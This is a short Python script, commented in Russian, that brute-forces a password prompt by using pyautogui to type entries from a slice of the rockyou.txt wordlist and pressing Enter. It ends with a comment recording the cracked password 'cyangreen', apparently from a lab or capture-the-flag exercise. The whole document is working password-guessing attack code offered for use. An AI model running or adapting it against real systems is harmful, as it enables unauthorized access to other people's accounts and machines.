import pyautogui
import time
import os

wordlist = "/usr/share/wordlists/rockyou.txt"

# Читаем нужный диапазон строк
with open(wordlist, "r", encoding="latin-1") as f:
    passwords = f.readlines()[8867548:8867553]  # Важно! Индексация с 0

print(f"[*] Загружено {len(passwords)} паролей для перебора.")

# Перебираем пароли
for password in passwords:
    password = password.strip()
    pyautogui.write(password)
    pyautogui.press("enter")
    time.sleep(1.5)  # Ждём реакцию системы
    pyautogui.press("enter")

# PASS : cyangreen